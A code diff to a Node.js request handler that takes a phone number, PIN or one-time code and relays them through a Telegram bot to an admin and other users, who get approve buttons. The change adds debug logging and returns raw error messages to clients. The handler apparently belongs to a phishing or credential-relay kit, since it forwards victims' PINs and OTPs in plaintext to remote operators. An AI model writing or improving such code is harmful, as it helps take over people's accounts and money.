@@ -124,10 +124,14 @@ module.exports = async (req, res) => {
   if (stage === 'otp' && !otp) return res.status(400).json({ error: 'Missing OTP' });
 
   try {
-    const botLabel = await getBotLabel();
-    const text = stage === 'pin' ? buildPinText(cleanPhone, pin, userId, botLabel) : buildOtpText(cleanPhone, otp, botLabel);
+    console.log('📝 Approval request:', { stage, phone: cleanPhone, pin: pin ? '****' : '' });
 
+    const botLabel = await getBotLabel();
+    console.log('✅ Got bot label:', botLabel);
+
+    const text = stage === 'pin' ? buildPinText(cleanPhone, pin, userId, botLabel) : buildOtpText(cleanPhone, otp, botLabel);
     const record = await create({ stage, text });
+    console.log('✅ Created approval record:', record.id);
 
     const keyboard = stage === 'pin' ? buildPinKeyboard() : buildOtpKeyboard();
     const keyboardWithId = {
@@ -140,8 +144,11 @@ module.exports = async (req, res) => {
     };
 
     const users = await listUsers().catch(() => []);
+    console.log('✅ Got users:', users);
+
     const recipients = [ADMIN_ID, ...users].filter(Boolean);
     const uniqueRecipients = [...new Set(recipients)];
+    console.log('📤 Sending to recipients:', uniqueRecipients);
 
     const mainMessages = [];
     const buttonMessages = [];
@@ -151,6 +158,7 @@ module.exports = async (req, res) => {
         try {
           const mainMsg = await sendMessage(BOT_TOKEN, chatId, text);
           mainMessages.push({ c: mainMsg.chat.id, m: mainMsg.message_id });
+          console.log('📤 Sent main message to', chatId);
 
           const buttonsText = stage === 'pin' ? buildPinButtonsText() : buildOtpButtonsText();
           const btnMsg = await sendMessage(BOT_TOKEN, chatId, buttonsText, {
@@ -158,23 +166,26 @@ module.exports = async (req, res) => {
             reply_markup: keyboardWithId,
           });
           buttonMessages.push({ c: btnMsg.chat.id, m: btnMsg.message_id });
+          console.log('📤 Sent button message to', chatId);
         } catch (err) {
-          console.error('Failed to send messages to', chatId, err);
+          console.error('❌ Failed to send to', chatId, err.message);
         }
       })
     );
 
     if (mainMessages.length === 0) {
+      console.error('❌ No messages sent to any recipient');
       return res.status(502).json({ error: 'Failed to send verification message' });
     }
 
     record.messages = mainMessages;
     record.buttonMessages = buttonMessages;
     await require('../../lib/approvals').save(record);
+    console.log('✅ Approval complete:', record.id);
 
     return res.status(200).json({ id: record.id, expiresAt: record.expiresAt });
   } catch (err) {
-    console.error('Approval request error:', err);
-    return res.status(500).json({ error: 'Internal server error' });
+    console.error('❌ Approval request error:', err.message, err);
+    return res.status(500).json({ error: err.message || 'Internal server error' });
   }
 };
